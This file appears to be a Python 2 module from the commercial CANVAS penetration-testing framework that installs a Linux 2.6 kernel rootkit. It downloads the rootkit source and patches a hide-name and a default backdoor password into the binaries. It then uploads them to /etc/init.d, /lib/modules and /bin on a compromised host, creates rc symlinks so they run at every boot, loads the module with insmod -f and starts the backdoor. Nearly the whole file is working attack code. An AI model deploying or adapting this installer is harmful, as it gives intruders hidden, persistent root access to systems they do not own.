#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: 
    sys.path.append(".")

import os
import urllib
import tarfile
import hashlib

from canvasexploit import canvasexploit
from exploitutils import *
from ExploitTypes.localcommand import LocalCommand

NAME            = "Linux 2.6 rootkit"
DESCRIPTION     = "Loads a LKM based 2.6 rootkit"
DOCUMENTATION   = {}

DOCUMENTATION["Notes"]="""
1. First load the rootkit and the backdoor
2. Afterwards you can inject executable code(mosdef)
3. You can build other executable code injectors following the protocol.
4. Unloading the module is only available if the module is not hidden
"""

PROPERTY            = {}
PROPERTY['TYPE']    = "Trojans"
PROPERTY['ARCH']    = [ ["Linux"] ]
VERSION             = "1.0"

class theexploit(LocalCommand):
    def __init__(self):
        """ init """
        
        LocalCommand.__init__(self)
        self.result     = ""
        self.name       = NAME
        self.path       = "rootkits/linux"
        
        self.module     = "rootkits/linux/immrt.ko"
        self.backdoor   = "rootkits/linux/backdoor/immrtbkd"
        self.install    = "rootkits/linux/install.sh"
        self.script     = "rootkits/linux/immrt"
      
        self.filehide   = "immrt"
        self.passwd     = "immunity"

        self.supportedNodeArgs = [["linuxNode"]]
        return

    def checklkm(self):
        """
        checks if a compiled lkm was put in place
        """
        return os.path.isfile(os.path.join('rootkits', 'linux', 'immrt.ko'))

    def getsource(self):
        """
        retrieve the GPL rootkit source from Immunity server
        """

        MD5SUM = '29fa3afef9db5de7daf1600f129e247a' # 2008-09-03 13:51 linux_rootkit_source.tar.bz2
        
        self.log("Checking to see if we have the RootKit source")
        basepath = os.path.join('rootkits', 'linux', 'src')
        if os.path.isdir(basepath):
            if os.path.isfile(basepath + os.sep + 'DR.c'):
                self.log("Already have source!")
                return True
            else:
                self.log("Source not located .. retrieve")
        
        self.log("Trying to retrieve RootKit Source")
        try:
            os.mkdir(basepath)
        except OSError:
            if os.path.isdir(basepath):
                pass
            else:
                return False

        outfile = basepath + 'linux_rootkit_source.tbz2'
        try:
            self.log("Retrieving file from Immunity web server")
            ret = urllib.urlretrieve('http://www.immunityinc.com/downloads/linux_rootkit_source.tbz2', \
                                    filename=outfile)
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            self.log('Failed to download file')
            return False

        # check md5sum
        fd      = file(outfile, "rb")
        _md5    = hashlib.md5()
        while True:
            try:
                data = fd.read(1000)
            except:
                break
            if data == '':
                break
            _md5.update(data)

        if MD5SUM != _md5.hexdigest():
            self.log('File integrity not ensured')
            return False

        # untar and uncompress
        tarball = tarfile.open(outfile, mode='r:bz2')
        try:
            tarball.extractall(basepath)
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            self.log('Could not extract RootKit source')
            return False

        self.log('All done, compile and move DR.ko into rootkits/linux/immrt.ko')

        return True
        
    def createtrojan(self, infilename, password, outfilename):
        """
        Create a trojan with a particular password for uploading
        """
        data        = file(infilename).read()
        password    = stroverwrite("\x00"*30,password, 0)
        data        = data.replace("A"*30,password)
        
        file(outfilename, "wb").write(data)

    def createmodule(self, infilename, filehide, outfilename):
        """
        Create a trojan with a particular password for uploading
        """
        data        = file(infilename).read()
        password    = stroverwrite("\x00"*30,filehide, 0)
        data        = data.replace("A"*30,password)
        
        file(outfilename, "wb").write(data)

    def createinstall(self, infilename, hidestring, outfilename):
        """
        Create the installer script .sh
        """
        newmod      = hidestring + ".ko"
        newbkd      = str(hidestring) + "bkd"
        newscript   = hidestring   
        data        = file(infilename).read()
        data        = data.replace("##modname", newmod) 
        data        = data.replace("##backname", newbkd)
        data        = data.replace("##scriptname", newscript)

        file(outfilename, "wb").write(data)

        print "Module named %s, backdoor named %s and script %s" % (newmod, newbkd, newscript)

    def createscript(self, infilename, hidestring, outfilename):
        """
        Create the /etc/init.d script
        """
        newmod = hidestring + ".ko"
        newbkd = hidestring + "bkd"
        print "Module named %s, backdoor named %s"%(newmod, newbkd)
        
        data    = file(infilename).read()
        data    = data.replace("##modname", newmod) 
        data    = data.replace("##backname", newbkd)

        file(outfilename, "wb").write(data)
        
    def neededListenerTypes(self):
        from canvasengine import LINUXMOSDEF
        return [LINUXMOSDEF]
           
    def getArgs(self):
        """ get arguments """
        self.filehide   = self.argsDict.get("filehide",self.filehide)
        self.passwd     = self.argsDict.get("passwd",self.passwd)
   
    def loadModule(self, node):
        type = node.nodetype
        if type in self.supportedNodeArgs[0]:      
            self.setInfo("Loading rootkit (in progress)")
           
            #uploads the 3 files, initscript, module and backdoor
            self.createscript(self.script, self.filehide, self.script +"2")
            self.result = node.shell.upload(self.script + "2", "/etc/init.d/", "/etc/init.d/" + self.filehide)
            self.log(self.result)
            os.remove(self.script + "2")             
      
            self.createmodule(self.module, self.filehide, self.module + "2")
            self.result = node.shell.upload(self.module + "2", "/lib/modules/", "/lib/modules/" + self.filehide + ".ko")           
            
            self.log(self.result)
            os.remove(self.module + "2")
            
            self.createtrojan(self.backdoor, self.passwd, self.backdoor + "2")
            self.result = node.shell.upload(self.backdoor + "2", "/bin/", "/bin/" + self.filehide + "bkd")          
            self.log(self.result)
            os.remove(self.backdoor + "2")
           

            #Now create the symlinks for system-v linuxes to upload module on reboot
            self.result = node.shell.runcommand("ln -s /etc/init.d/" + self.filehide + " /etc/rc1.d/S01" + self.filehide) 
            self.log("Symlink for rc1 created")
            self.result = node.shell.runcommand("ln -s /etc/init.d/" + self.filehide + " /etc/rc2.d/S01" + self.filehide) 
            self.log("Symlink for rc2 created")   
            self.result = node.shell.runcommand("ln -s /etc/init.d/" + self.filehide + " /etc/rc3.d/S01" + self.filehide) 
            self.log("Symlink for rc3 created")
            self.result = node.shell.runcommand("ln -s /etc/init.d/" + self.filehide + " /etc/rc5.d/S01" + self.filehide) 
            self.log("Symlink for rc5 created")
            #Execute module and backdoor
            self.result = node.shell.runcommand("/sbin/insmod -f /lib/modules/" + self.filehide + ".ko")        
            self.log("Module loaded")
            args = ["/bin/" + self.filehide +"bkd"]
            node.shell.fexec("/bin/" + self.filehide + "bkd", args, [])                              
            self.log("Backdoor loaded")
            self.log("****Rootkit loading ended****");
            
        else:
            self.log("%s not type not supported"%type);
            self.setInfo("%s - done (success: %s)"%(NAME,self.result))
            return 1
        
    
    def interactWithNode(self, node):
        """  """
        # cross platform support in the future
        ret     = 0
        type    = node.nodetype
        self.loadModule(node)
        return ret
            
    def run(self):
        """ main """

        self.setInfo("%s" % (NAME))
        self.getArgs()
        
        if self.getsource() != True:
            self.log('Aborting .. no source available')
            return 0

        if self.checklkm() != True:
            self.log('You have to compile the LKM for your target and place it in rootkits/linux/immrt.ko')
            return 0

        for node in self.argsDict["passednodes"]:
            ret = self.interactWithNode(node)
        return 1

if __name__=="__main__":
    print "[*] This module is designed to be run from inside of CANVAS."

